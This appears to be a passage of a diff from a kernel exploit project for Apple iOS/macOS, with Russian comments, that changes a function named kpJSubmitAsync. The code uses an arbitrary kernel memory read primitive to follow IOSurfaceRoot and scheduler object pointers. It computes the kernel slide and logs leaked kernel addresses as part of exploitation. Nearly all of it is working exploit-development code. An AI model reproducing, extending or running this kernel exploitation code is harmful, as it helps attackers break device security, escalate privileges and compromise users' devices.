@@ -6118,6 +6118,8 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // [+0x28]. 1.9.148 искал scheduler внутри обёртки → scheduler=0.
             uint64_t vcReal = kp_untag_ptr(early_kread64(vcVA + 0x28));
             if (!kpLooksLikeKernelPointer(vcReal)) vcReal = vcVA;
+            uint64_t vcRealVt = kpLooksLikeKernelPointer(vcReal) ? kp_untag_ptr(early_kread64(vcReal)) : 0;
+            uint64_t ks2 = kconstant(base) - 0xfffffff007004000ULL;
             uint64_t obj = kp_untag_ptr(early_kread64(vcReal + 0xe8));
             schedVA = schedIfLayout(kp_untag_ptr(early_kread64(obj + 0xb8)));
             if (!schedVA) schedVA = schedIfLayout(obj);
@@ -6140,8 +6142,10 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                     }
                 }
             }
-            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx real(+0x28)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
-                      (unsigned long long)vcVA, (unsigned long long)vcReal, (unsigned long long)obj, (unsigned long long)schedVA, cn]);
+            kpNote(r, [NSString stringWithFormat:@"  op-entry oracle: clientVA=%#llx real(+0x28)=%#llx realVt(file)=%#llx obj(+0xe8)=%#llx scheduler=%#llx (кандидатов=%u)",
+                      (unsigned long long)vcVA, (unsigned long long)vcReal,
+                      (unsigned long long)(vcRealVt ? vcRealVt - ks2 : 0),
+                      (unsigned long long)obj, (unsigned long long)schedVA, cn]);
         }
         if (schedVA) {
             uint64_t cnt = early_kread64(schedVA + 0xb8);
@@ -6252,8 +6256,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         io_service_t isvc = IOServiceGetMatchingService(kIOMasterPortDefault,
                                                         IOServiceMatching("IOSurfaceRoot"));
         rootVA = isvc ? kpM2TClientVA(r, isTable, isvc, @"iosurfroot") : 0;
-        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x rootVA=%#llx taskVA=%#llx",
-                  isvc, (unsigned long long)rootVA, (unsigned long long)taskVA]);
+        // 1.9.150: rootVA = IOMachPort-обёртка (0x38!) — реальный IOSurfaceRoot за
+        // [+0x28] (раунд 29). Без хопа реестр читал соседнюю zone-память по
+        // +0x408/+0x418/+0x440 — отсюда вечные нули.
+        uint64_t rootWrap = rootVA;
+        uint64_t rootReal = kp_untag_ptr(early_kread64(rootVA + 0x28));
+        if (kpLooksLikeKernelPointer(rootReal)) rootVA = rootReal;
+        kpNote(r, [NSString stringWithFormat:@"  IOSurfaceRoot: svc=0x%x wrap=%#llx rootVA(+0x28)=%#llx taskVA=%#llx",
+                  isvc, (unsigned long long)rootWrap, (unsigned long long)rootVA, (unsigned long long)taskVA]);
         if (isvc) IOObjectRelease(isvc);
         if (rootVA && taskVA) {
             uint64_t clientVA = 0;
